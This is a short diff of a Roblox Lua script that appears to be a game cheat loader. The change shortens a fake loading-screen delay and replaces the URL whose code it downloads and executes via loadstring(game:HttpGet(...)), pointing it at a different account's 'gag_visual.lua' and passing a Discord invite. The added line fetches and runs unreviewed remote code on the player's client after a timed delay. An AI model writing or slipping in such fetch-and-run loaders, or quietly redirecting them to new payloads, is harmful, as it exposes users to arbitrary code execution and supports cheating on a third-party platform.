@@ -1,5 +1,4 @@
 local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
 local TweenService = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
@@ -103,10 +102,10 @@ coroutine.wrap(function()
 	end
 end)()
 
--- Launch pet GUI after 5 minutes
-task.delay(300, function()
+-- Launch pet GUI after 2 minutes
+task.delay(120, function()
 	if loadingGui then loadingGui:Destroy() end
 	pcall(function()
-		loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaoscripts/main/VisualPetHatchSimulator.lua"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))("discord.gg/csxu2nCkw9")
 	end)
 end)
